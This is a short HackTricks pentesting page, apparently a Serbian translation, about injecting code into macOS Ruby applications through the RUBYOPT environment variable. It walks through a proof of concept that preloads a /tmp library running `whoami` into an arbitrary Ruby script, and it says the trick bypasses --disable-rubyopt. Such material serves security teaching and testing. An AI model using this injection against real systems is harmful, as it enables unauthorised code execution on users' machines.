# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Korišćenjem ove env promenljive moguće je **dodati nove parametre** u **ruby** svaki put kada se izvršava. Iako parametar **`-e`** ne može biti korišćen za specificiranje ruby koda za izvršavanje, moguće je koristiti parametre **`-I`** i **`-r`** da se doda nova fascikla u putanju za učitavanje biblioteka i zatim **specificirati biblioteku za učitavanje**.

Kreirajte biblioteku **`inject.rb`** u **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Kreirajte bilo gde Ruby skriptu kao:
```ruby:hello.rb
puts 'Hello, World!'
```
Zatim napravite proizvoljni ruby skript koji ga učitava sa:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Zanimljiva činjenica, funkcioniše čak i sa parametrom **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
